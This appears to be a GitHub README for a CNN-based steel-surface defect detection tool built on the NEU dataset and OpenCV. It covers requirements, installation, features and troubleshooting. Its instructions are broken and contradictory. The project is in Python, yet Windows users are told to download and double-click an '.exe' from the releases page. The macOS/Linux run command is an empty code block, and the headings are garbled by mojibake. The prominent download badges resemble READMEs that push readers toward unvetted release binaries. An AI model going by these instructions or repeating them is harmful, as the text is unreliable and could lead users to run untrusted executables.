[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Sw-a-r-u-p/steelsurface-defect-detection/releases)

## üìñ Overview

The steelsurface-defect-detection application uses Convolutional Neural Networks (CNNs) to detect defects on steel surfaces. It employs the NEU dataset and features OpenCV for image preprocessing. This application provides labeled visualizations of output, achieving approximately 96% accuracy. It simplifies quality control in the manufacturing industry, ensuring that only high-quality products leave the factory.

## üöÄ Getting Started

To use the steelsurface-defect-detection application, follow these steps:

1. **Check System Requirements:**
   - Operating System: Windows, macOS, or Linux
   - RAM: At least 4 GB
   - Python 3.6 or higher
   - Additional libraries: OpenCV, TensorFlow, Keras

2. **Visit the Releases Page:**
   - Click the link below to go to the releases page.
   - [Download from Releases](https://github.com/Sw-a-r-u-p/steelsurface-defect-detection/releases)

3. **Download the Application:**
   - Find the latest version listed on the releases page.
   - Download the appropriate file for your operating system.

4. **Install Required Libraries:**
   - Open your command line or terminal.
   - Enter the following commands to install required libraries:
     ```
     pip install opencv-python tensorflow keras
     ```
   - Ensure that these installations complete without errors.

5. **Run the Application:**
   - Locate the downloaded file on your computer.
   - For Windows: Double-click the `.exe` file or run it from the command line.
   - For macOS or Linux: Open the terminal, navigate to the download folder, and enter:

     ```
   - Replace `your_application_file.py` with the actual filename.

## üì∏ Features

- **High Accuracy:** Achieves around 96% accuracy in defect detection.
- **Real-time Processing:** Analyze images quickly using OpenCV.
- **User-Friendly Interface:** Designed for users with no programming experience.
- **Visual Outputs:** See labeled output on defects in processed images.

## ‚öôÔ∏è How It Works

The application relies on a pre-trained CNN model. It takes steel surface images as input and processes them using OpenCV for enhancements, such as noise reduction and contrast adjustment. The model then predicts the presence of defects like scratches, rust, or dents. The results are visualized clearly, helping users identify issues effortlessly.

## üîß Troubleshooting

If you encounter issues while downloading or running the application, consider the following:

1. **Installation Errors:**
   - Ensure that pip is installed. You can check by running `pip --version` in your terminal.
   - If installation fails, try updating pip with `pip install --upgrade pip`.

2. **Compatibility Issues:**
   - Check your operating system version to ensure it meets the requirements.
   - Ensure that Python and required libraries are correctly installed.

3. **Application Not Starting:**
   - Verify that you are running the application from the correct directory.
   - Check if all required libraries are installed properly.
